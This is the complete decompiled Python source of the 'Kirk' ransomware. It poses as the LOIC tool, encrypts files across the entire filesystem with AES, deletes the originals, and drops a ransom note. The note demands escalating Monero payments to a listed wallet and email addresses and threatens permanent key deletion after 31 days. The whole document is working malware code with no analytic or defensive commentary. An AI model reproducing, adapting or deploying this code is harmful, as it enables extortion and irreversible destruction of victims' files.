# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.14 (default, Sep 25 2017, 09:53:22) 
"""

Kirk encryptor

"""
import tkMessageBox, Tkinter as tk
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import os, random, string, time, threading, Queue, datetime
tn = datetime.datetime.now()
tn_2 = datetime.datetime.strftime(tn + datetime.timedelta(days=2), '%c')
tn_7 = datetime.datetime.strftime(tn + datetime.timedelta(days=7), '%c')
tn_14 = datetime.datetime.strftime(tn + datetime.timedelta(days=14), '%c')
tn_30 = datetime.datetime.strftime(tn + datetime.timedelta(days=30), '%c')
tn_31 = datetime.datetime.strftime(tn + datetime.timedelta(days=31), '%c')
tn = datetime.datetime.strftime(tn, '%c')
deltas = [
 tn_2, tn_7, tn_14, tn_30, tn_31]
TK_TITLE = 'Low Orbital Ion Cannon | When harpoons, air strikes and nukes fail | v1.0.1.0'
NOTE_NAME = 'RANSOM_NOTE.txt'
PWDF_NAME = 'pwd'
THREAD_NUM = 22
queue = Queue.Queue()
files_to_enc = []
pubkeyDat = '-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAoQpUk7lhDoenoPTCLRjG\nLStBjoT9owWl3HuYezrpmDt60t0P4/jlrwDC06POYxGpDDUbC2SfhcvbemFXWmX/\nzCM92h94v6sxfc6GOfKLbdwudSMOJ+TOSd7XGa3okcIbAh7bVR28XPBOGcg203Z/\n7YJh+wHHnjGjOxcUZIcM3X2BPDIEuc1jxgWgDEIMmjb+yi6m3YdtAmwmurV8wb61\njXrBY936IVxYc3sxw94x9GjfsIspmdurV5En1DEkXPORp7IU5q6Zj4ZZsLwyT+xX\n5V5MdWVYhOJV4X8pLPHUPjvAHQX1POGnX/DVlieG//RXOi0mnR+Vh4OjvBsXC10V\nqrQgZZXByHOtjrdfXgZH8Izr+KuyTVRGILvj884EZ1DMI6L4sb4F9EUjcRacO/tU\nRdduUTw3Q5qsbLPQiS/V4MBEQswlH7UVMiWxfNymyvM5I3BfFeW2QwauRGH5xmaD\nsQG0Yy/AsPzvHKqoShP/LepO1bYUdUodvnfVbChPGTYzZrwmnixS/m5AxyhUh/Ex\n3cxZ5raJWnBfx72wsviuAPIrXqyzlTlNo6aPX029Oh52ezk4uYwLpN02IjJ6yUEg\nyFkqbhASCtvYjqAprvCheane2j7+U7RnjZ+jLNgMWSc5M1pdGK4YYT+U3yfWqbdG\nRSie6e+LhifKADqjHeXSAVsCAwEAAQ==\n-----END PUBLIC KEY-----'
pk = RSA.importKey(pubkeyDat)
rp = None
UNDOC_EXTS = [
 'cfr', 'ytd', 'sngw', 'tst', 'skudef', 'dem', 'sims3pack', 'hbr',
 'hkx', 'rgt', 'ggpk', 'ttarch2', 'hogg', 'spv', 'bm2', 'lua', 'dff',
 'save', 'rgssad', 'scm', 'aud', 'rxdata', 'mcmeta', 'bin', 'mpqe',
 'rez', 'xbe', 'grle', 'bf', 'iwd', 'vpp_pc', 'scb', 'naz', 'm2', 'xpk',
 'sabs', 'nfs13save', 'gro', 'emi', 'wad', '15', 'vfs', 'drs', 'taf', 'm4s',
 'player', 'umv', 'sgm', 'ntl', 'esm', 'qvm', 'arch00', 'tir', 'bk', 'sabl',
 'bin', 'opk', 'vfs0', 'xp3', 'tobj', 'rcf', 'sga', 'esf', 'rpack', 'DayZProfile',
 'qsv', 'gam', 'bndl', 'u2car', 'psk', 'gob', 'lrf', 'lts', 'iqm', 'i3d', 'acm',
 'SC2Replay', 'xfbin', 'db0', 'fsh', 'dsb', 'cry', 'osr', 'gcv', 'blk', '4', 'lzc',
 'umod', 'w3x', 'mwm', 'crf', 'tad', 'pbn', '14', 'ppe', 'ydc', 'fmf', 'swe', 'nfs11save',
 'tgx', 'trf', 'atlas', '20', 'game', 'rw', 'rvproj2', 'sc1', 'ed', 'lsd', 'pkz', 'rim',
 'bff', 'gct', '9', 'fpk', 'pk3', 'osf', 'bns', 'cas', 'lfl', 'rbz', 'sex', 'mrm', 'mca',
 'hsv', 'vpt', 'pff', 'i3chr', 'tor', '01', 'utx', 'kf', 'dzip', 'fxcb', 'modpak', 'ydr',
 'frd', 'bmd', 'vpp', 'gcm', 'frw', 'baf', 'edf', 'w3g', 'mtf', 'tfc', 'lpr', 'pk2', 'cs2',
 'fps', 'osz', 'lnc', 'jpz', 'tinyid', 'ebm', 'i3exec', 'ert', 'sv4', 'cbf', 'oppc', 'enc',
 'rmv', 'mta', 'otd', 'pk7', 'gm', 'cdp', 'cmg', 'ubi', 'hpk', 'plr', 'mis', 'ids',
 'replay_last_battle', 'z2f', 'map', 'ut4mod', 'dm_1', 'p3d', 'tre', 'package', 'streamed',
 'l2r', 'xbf', 'wep', 'evd', 'dxt', 'bba', 'profile', 'vmt', 'rpf', 'ucs', 'lab', 'cow', 'ibf',
 'tew', 'bix', 'uhtm', 'txd', 'jam', 'ugd', '13', 'dc6', 'vdk', 'bar', 'cvm', 'wso', 'xxx', 'zar',
 'anm', '6', 'ant', 'ctp', 'sv5', 'dnf', 'he0', 'mve', 'emz', 'e4mod', 'gxt', 'bag', 'arz', 'tbi',
 'itp', 'i3animpack', 'vtf', 'afl', 'ncs', 'gaf', 'ccw', 'tsr', 'bank', 'lec', 'pk4', 'psv',
 'los', 'civ5save', 'rlv', 'nh', 'sco', 'ims', 'epc', 'rgm', 'res', 'wld', 'sve', 'db1', 'dazip',
 'vcm', 'rvm', 'eur', 'me2headmorph', 'azp', 'ags', '12', 'slh', 'cha', 'wowsreplay', 'dor',
 'ibi', 'bnd', 'zse', 'ddsx', 'mcworld', 'intr', 'vdf', 'mtr', 'addr', 'blp', 'mlx', 'd2i', '21',
 'tlk', 'gm1', 'n2pk', 'ekx', 'tas', 'rav', 'ttg', 'spawn', 'osu', 'oac', 'bod', 'dcz', 'mgx',
 'wowpreplay', 'fuk', 'kto', 'fda', 'vob', 'ahc', 'rrs', 'ala', 'mao', 'udk', 'jit', '25', 'swar',
 'nav', 'bot', 'jdf', '32', 'mul', 'szs', 'gax', 'xmg', 'udm', 'zdk', 'dcc', 'blb', 'wxd', 'isb',
 'pt2', 'utc', 'card', 'lug', 'JQ3SaveGame', 'osk', 'nut', 'unity', 'cme', 'elu', 'db7', 'hlk',
 'ds1', 'wx', 'bsm', 'w3z', 'itm', 'clz', 'zfs', '3do', 'pac', 'dbi', 'alo', 'gla', 'yrm', 'fomod',
 'ees', 'erp', 'dl', 'bmd', 'pud', 'ibt', '24', 'wai', 'sww', 'opq', 'gtf', 'bnt', 'ngn', 'tit', 'wf',
 'bnk', 'ttz', 'nif', 'ghb', 'la0', 'bun', '11', 'icd', 'z3', 'djs', 'mog', '2da', 'imc', 'sgh', 'db9',
 '42', 'vis', 'whd', 'pcc', '43', 'ldw', 'age3yrec', 'pcpack', 'ddt', 'cok', 'xcr', 'bsp', 'yaf',
 'swd', 'tfil', 'lsd', 'blorb', 'unr', 'mob', 'fos', 'cem', 'material', 'lfd', 'hmi', 'md4', 'dog',
 '256', 'eix', 'oob', 'cpx', 'cdata', 'hak', 'phz', 'stormreplay', 'lrn', 'spidersolitairesave-ms',
 'anm', 'til', 'lta', 'sims2pack', 'md2', 'pkx', 'sns', 'pat', 'tdf', 'cm', 'mine', 'rbn', 'uc', 'asg',
 'raf', 'myp', 'mys', 'tex', 'cpn', 'flmod', 'model', 'sfar', 'fbrb', 'sav2', 'lmg', 'tbc', 'xpd',
 'bundledmesh', 'bmg', '18', 'gsc', 'shader_bundle', 'drl', 'world', 'rwd', 'rwv', 'rda']
REAL_EXTS = [
 '.3g2', '.3gp', '.asf', '.asx', '.avi', '.flv', '.ai',
 '.m2ts', '.mkv', '.mov', '.mp4', '.mpg', '.mpeg', 'mpeg4',
 '.rm', '.swf', '.vob', '.wmv', '.doc', '.docx', '.pdf',
 '.rar', '.jpg', '.jpeg', '.png', '.tiff', '.zip', '.7z', '.dif.z',
 '.exe', '.tar.gz', '.tar', '.mp3', '.sh', '.c', '.cpp',
 '.h', '.mov', '.gif', '.txt', '.py', '.pyc', '.jar', '.csv',
 '.psd', '.wav', '.ogg', '.wma', '.aif', '.mpa', '.wpl', '.arj',
 '.deb', '.pkg', '.db', '.dbf', '.sav', '.xml', '.html', '.aiml',
 '.apk', '.bat', '.bin', '.cgi', '.pl', '.com', '.wsf', '.bmp',
 '.bmp', '.gif', '.tif', '.tiff', '.htm', '.js', '.jsp', '.php',
 '.xhtml', '.cfm', '.rss', '.key', '.odp', '.pps', '.ppt', '.pptx',
 '.class', '.cd', '.java', '.swift', '.vb', '.ods', '.xlr', '.xls',
 '.xlsx', '.dot', '.docm', '.dotx', '.dotm', '.wpd', '.wps', '.rtf',
 '.sdw', '.sgl', '.vor', '.uot', '.uof', '.jtd', '.jtt', '.hwp', '.602',
 '.pdb', '.psw', '.xlw', '.xlt', '.xlsm', '.xltx', '.xltm', '.xlsb',
 '.wk1', '.wks', '.123', '.sdc', '.slk', '.pxl', '.wb2', '.pot', '.pptm',
 '.potx', '.potm', '.sda', '.sdd', '.sdp', '.cgm', '.wotreplay', '.rofl',
 '.pak', '.big', '.bik', '.xtbl', '.unity3d', '.capx', '.ttarch', '.iwi',
 '.rgss3a', '.gblorb', '.xwm', '.j2e', '.mpk', '.xex', '.tiger', '.lbf',
 '.cab', '.rx3', '.epk', '.vol', '.asset', '.forge', '.lng', '.sii', '.litemod',
 '.vef', '.dat', '.papa', '.psark', '.ydk', '.mpq', '.wtf', '.bsa', '.re4',
 '.dds', '.ff', '.yrp', '.pck', '.t3', '.ltx', '.uasset', '.bikey', '.patch',
 '.upk', '.uax', '.mdl', '.lvl', '.qst', '.ddv', '.pta']
INIT_EXTS = [] + REAL_EXTS
for ue in UNDOC_EXTS:
    INIT_EXTS.append('.' + ue)
seen = []
ALL_EXTS = []
for re in INIT_EXTS:
    if re in seen:
        pass
    else:
        ALL_EXTS.append(re)
    seen.append(re)
cols = 9
if len(REAL_EXTS) % cols != 0:
    for ec in range(cols - len(REAL_EXTS) % cols):
        REAL_EXTS.append(' ')
split = [ REAL_EXTS[i:i + len(REAL_EXTS) / cols] for i in range(0, len(REAL_EXTS), len(REAL_EXTS) / cols) ]
PRETTY_EXTS = ''
for row in zip(*split):
    PRETTY_EXTS += '\n    ' + ('').join((str.ljust(i, 10) for i in row))
R_NOTE = ('\n                     :xxoc;;,..                                        .\n                    cWW0olkNMMMKdl;.                       .;llxxklOc,\'\n                   oWMKxd,  .,lxNKKOo;.                  :xWXklcc;.     ...\'.\n           k      lMMNl   .    ON.                         :c.             \'\'.  \':....\n          .WXc   ;WMMMXNNXKKxdXMM.                                                .    .\n          .NdoK: XMMMMMMMMMMMMMMM;oo;                                ...;,cxxxll.       .\n          .WX.K0\'WMMMWMMMMMWMNXWMooMWNO\'                         ..,;OKNWWWWMMMMMXk:.\n           KK:xKKWMMMXNMMMMW;  .. :WNKd,                ..    .\'cdOXKXNNNNNWWMMMMMMMW0,\n           lNMXXMMMMMMMMWWMMWKk,  ;0k\'                    .,cxxk0K0O0XXWWMMMMMMMMMMMMMMX:..   ..\n            ..,;XMMMMMMMWXWWK0KK: .;.                    .:lddddxOOO0XWMMMMMMMMMMMMMMMMMMO.    .,\n              .kKXMMMMMWkoxolcc;..                      .\':loodxO00OO0NNXNWMMMMMMMMMMMMMMMN;     \'.\n              .MK;kWMMMWWKOc.  .                        ..\';cdxkKNX0kOOOKNMMMMMMMMMMMMMMMMMW:    .\n              ,MW:,:x0NMMMMWW0x\'                          ..,:dXNWW0xkkKWMMMMMMMMMMMMMMMMMMWk.  ..\n              oMMN;    ;odoccc;c:.                         ...lXWWMOok0NMMMMMWNXKXKXWMMMMMMMOc.\n              XMMMX,                                    ....\';lldkWkodK0loc\'.  .\'lxx0kOKNMMMXo.\n            \'XMMMMMNc                                            .dldXWx.      ..,,coOXOkXMMMK,\n       ,.   .:dk0KNWMk.                                 ...        .kWMK,.  ..:c .:.. .0MWMMMMO.\n  .\':x0K0:.          ..   .                                 .      .OWMNNXO:cccdxKXWMW0o0WWMMMM;.\n 00000000000kdl:,\'.                                      ..\'o00l   \'KMMNKNWWNKXWWMMMMMMMMMMMMMM0.\n 0000000000000000000Oxl:\'                                .;xKWWx  .xNMMMWNMMMMMMMMMMMMMMMMMMMMMMl\n 0000000000000000000000000x;. ..,::,.                  .ck0KKk\'   \'0WMMMMMMMWWMMMMMMMMMMMMMMMMMM0.   .\'\n 0000000000000000000000000000Oxdllc:;,....,\'...       .cdkOko:     ,cOKKXWMMMKd0WMMMMMMMMMMMMMWW0. \'Kc:,\n 000000000000000000000000000000000OkkkxdoodxOkoooool   .;okOx,       .,\'...cKMXl\'oKWMMMMMMMWWNXN0  \'MMc0.\n 0000OO000000000000000000000000000000000000000kc.      .:dk0c         ,KNKxdKMMM0;;kMMMMMMMMWNKXO  ,kW0xl\n OdloxO000000000000000000000000000000000000000000x,     .,ll;      .lokKWMMMMMMMMM0xNMMMMMMMNXXNo.xK;cXKx\n lx000000000000000000000000000000000000000000000000l     .\'..    .\'cKWXOXMMMMMMMMMMMMMMMMMWWNXXNKX0MNkNK0..\n 00000000000000000000000000000000000000000000000000O      ..    ..,;ok0X000KKXWMNNMMMMMMMMNNXKKXX00MMMWWc\',\n 00000000000000000000000000000000000000000000000000d              .. ..........;;.cKMMMMMWNXKKXNKxkNMMX,\n 000000000000000000000000000000000000000Ko.0000000Ol                .\'::odkkOOOxxxoxNMMMMNNWNXKK0k..;\'\n 0000000000000000000000000000000000000000..:000000kl             .:coododkXWMMMMMMMWWMMMNNNNNKOkkx:\n :;ok00000000000000000000000000000000000O.;.d00000dc        ...   .........cONMMMMMMMMMNXXXN0dlddxN.\n .dk000000000000000000000000000000000000;ld,.O00kocc        ..    ...,;::lokKNMMMMMMMMWKOO0OxloocxM:\n OO0000000000000000000000000000000000000ol0Koc0xc:ll  .         ..;lxO0XNNMMMMMMMMMMMN0xoxOdl::,;0Md\n :;,\'..;loxk000000000000000000000000000000000lx..loo ,0          .\'\';lkKKNMMMMMMMMMNOd:;lc:;\'..,kWMK\n cccldxkkkO00Okdooddxk00000000000000000000000Oc\'lddl dK,            .\':ollokOOOOOOOc\'.........lXMMMM,\n 000000kdoc,....;cldkO0000000000000000000000Okdodddo\'K0\'.                   .......        .oKMMMMMM0\n :,\'....\',;:ldkO0000000000000000000000000000Okxodddd;Xk,...                              .l0NMMMMMMMM:\n OO000000000000000000000000000000000000000000OkodxxxoXo,,,..                           .:kKWMMMMMMMMMW\'\n dO0000000000000000000000000000000000000000000OodxxxkKl;,,,,                          \'dOKWMMMMMMMMMMMX\n\n      _  _____ ____  _  __   ____      _    _   _ ____   ___  __  ____        ___    ____  _____ \n     | |/ /_ _|  _ \\| |/ /  |  _ \\    / \\  | \\ | / ___| / _ \\|  \\/  \\ \\      / / \\  |  _ \\| ____|\n     | \' / | || |_) | \' /   | |_) |  / _ \\ |  \\| \\___ \\| | | | |\\/| |\\ \\ /\\ / / _ \\ | |_) |  _|  \n     | . \\ | ||  _ <| . \\   |  _ <  / ___ \\| |\\  |___) | |_| | |  | | \\ V  V / ___ \\|  _ <| |___ \n     |_|\\_\\___|_| \\_\\_|\\_\\  |_| \\_\\/_/   \\_\\_| \\_|____/ \\___/|_|  |_|  \\_/\\_/_/   \\_\\_| \\_\\_____|\n\n\nOh no! The Kirk ransomware has encrypted your files!\n\n\n-----------------------------------------------------------------------------------------------------\n\n> ! IMPORTANT ! READ CAREFULLY:\n\nYour computer has fallen victim to the Kirk malware and important files have been encrypted - locked\nup so they don\'t work. This may have broken some software, including games, office suites etc.\n\nHere\'s a list of some the file extensions that were targetted:\n{}\n\nThere are an additional {} file extensions that are targetted. They are mostly to do with games.\n\nTo get your files back, you need to pay. Now. Payments recieved more than 48 hours after the time of\ninfection will be charged double. Further time penalties are listed below. The time of infection has\nbeen logged.\n\nAny files with the extensions listed above will now have the extra extension \'.kirked\', these files\nare encrypted using military grade encryption.\n\nIn the place you ran this program from, you should find a note (named {}) similar to this one.\nYou will also find a file named \'{}\' - this is your encrypted password file. Although it was\ngenerated by your computer, you have no way of ever decrypting it. This is due to the security\nof both the way it was generated and the way it was encrypted. Your files were encrypted using\nthis password.\n\n ____  ____   ___   ____ _  __   _____ ___     _____ _   _ _____    ____  _____ ____   ____ _   _ _____ _ \n/ ___||  _ \\ / _ \\ / ___| |/ /  |_   _/ _ \\   |_   _| | | | ____|  |  _ \\| ____/ ___| / ___| | | | ____| |\n\\___ \\| |_) | | | | |   | \' /     | || | | |    | | | |_| |  _|    | |_) |  _| \\___ \\| |   | | | |  _| | |\n ___) |  __/| |_| | |___| . \\     | || |_| |    | | |  _  | |___   |  _ <| |___ ___) | |___| |_| | |___|_|\n|____/|_|    \\___/ \\____|_|\\_\\    |_| \\___/     |_| |_| |_|_____|  |_| \\_\\_____|____/ \\____|\\___/|_____(_)\n\n  "Logic, motherfucker." ~ Spock.\n\n\nDecrypting your files is easy. Take a deep breath and follow the steps below.\n\n 1 ) Make the proper payment.\n     Payments are made in Monero. This is a crypto-currency, like bitcoin.\n     You can buy Monero, and send it, from the same places you can any other\n     crypto-currency. If you\'re still unsure, google \'bitcoin exchange\'.\n\n     Sign up at one of these exchange sites and send the payment to the address below.\n\n     Make note of the payment / transaction ID, or make one up if you have the option.\n\n    Payment Address (Monero Wallet):\n      4AqSwfTexbNaHcn8giSJw3KPiWYHGBaCF9bdgPxvHbd5A8Q3Fc7n6FQCReEns8uEg8jUo4BeB79rwf4XSfQPVL1SKdVp2jz\n\n      Prices:\n        Days   :  Monero  : Offer Expires\n        0-2    :  50      : {}\n        3-7    :  100     : {}\n        8-14   :  200     : {}\n        15-30  :  500     : {}\n\n    Note: In 31 days your password decryption key gets permanently deleted.\n          You then have no way to ever retrieve your files. So pay now.\n\n 2 ) Email us.\n     Send your pwd file as an email attachment to one of the email addresses below.\n     Include the payment ID from step 1.\n\n     Active email addresses:\n        kirk.help@scryptmail.com\n        kirk.payments@scryptmail.com\n\n 3 ) Decrypt your files.\n     You will recieve your decrypted password file and a program called \'Spock\'.\n     Download these both to the same place and run Spock.\n     Spock reads in your decrypted password file and uses it to decrypt all of the\n     affected files on your computer.\n\n     > IMPORTANT !\n       The password is unique to this infection.\n       Using an old password or one from another machine will result in corrupted files.\n       Corrupted files cannot be retrieved.\n       Don\'t fuck around.\n\n 4 ) Breathe.\n\n\n       _     _____     _______    _     ___  _   _  ____ \n      | |   |_ _\\ \\   / / ____|  | |   / _ \\| \\ | |/ ___|\n      | |    | | \\ \\ / /|  _|    | |  | | | |  \\| | |  _ \n      | |___ | |  \\ V / | |___   | |__| |_| | |\\  | |_| |\n      |_____|___|  \\_/  |_____|  |_____\\___/|_| \\_|\\____|\n                         _    _   _ ____     ____  ____   ___  ____  ____  _____ ____  \n                        / \\  | \\ | |  _ \\   |  _ \\|  _ \\ / _ \\/ ___||  _ \\| ____|  _ \\ \n                       / _ \\ |  \\| | | | |  | |_) | |_) | | | \\___ \\| |_) |  _| | |_) |\n                      / ___ \\| |\\  | |_| |  |  __/|  _ <| |_| |___) |  __/| |___|  _ < \n                     /_/   \\_\\_| \\_|____/   |_|   |_| \\_\\\\___/|____/|_|   |_____|_| \\_\\\n\n\n\n').format(PRETTY_EXTS, len(UNDOC_EXTS), NOTE_NAME, PWDF_NAME, tn_2, tn_7, tn_14, tn_30)

def select_files():
    global queue
    ext = ALL_EXTS
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.lower().endswith(tuple(ext)):
                queue.put(os.path.join(root, file))

class Worker(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            qItem = self.queue.get()
            try:
                self.encrypt(qItem)
                with open(qItem, 'wb'):
                    pass
                try:
                    os.remove(qItem)
                except Exception as ex:
                    pass
            except Exception as ex:
                pass
            self.queue.task_done()

    def encrypt(self, filename):
        global rp
        chunk_size = 65536
        outputFile = filename + '.kirked'
        filesize = str(os.path.getsize(filename)).zfill(16)
        IV = ''
        for i in range(16):
            IV += chr(random.randint(0, 255))
        encryptor = AES.new(rp, AES.MODE_CBC, IV)
        with open(filename, 'rb') as (infile):
            with open(outputFile, 'wb') as (outfile):
                outfile.write(filesize)
                outfile.write(IV)
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    else:
                        if len(chunk) % 16 != 0:
                            chunk += ' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptor.encrypt(chunk))

def drop_note():
    with open(NOTE_NAME, 'wb+') as (rnf):
        rnf.write(R_NOTE)

def Main():
    global rp
    orp = tn + ('').join((random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(64)))
    rp = SHA256.new(orp).digest()
    if rp == None:
        quit()
    try:
        with open(PWDF_NAME, 'wb') as (pwdf):
            encp = pk.encrypt(orp, 32)[0]
            pwdf.write(encp)
    except Exception:
        pass
    for i in range(THREAD_NUM):
        w = Worker(queue)
        w.setDaemon(True)
        w.start()
    tkMessageBox.showinfo(TK_TITLE, 'The LOIC is initializing for your system ...\nThis may take some time')
    select_files()
    queue.join()
    drop_note()
    root = tk.Tk()
    root.title('Kirk')
    scrollbar = tk.Scrollbar(root)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    T = tk.Text(root, height=50, width=110, background='black', foreground='white', yscrollcommand=scrollbar.set)
    T.pack(side=tk.LEFT)
    T.insert(tk.END, R_NOTE)
    T.config(state='disabled')
    scrollbar.config(command=T.yview)
    root.update()
    root.mainloop()
    return

if __name__ == '__main__':
    try:
        with open('pwd', 'r') as (test_pwdf):
            tkMessageBox.showinfo('Kirk', 'We recommend that you do NOT run this again')
            quit()
    except Exception as ex:
        pass
    Main()
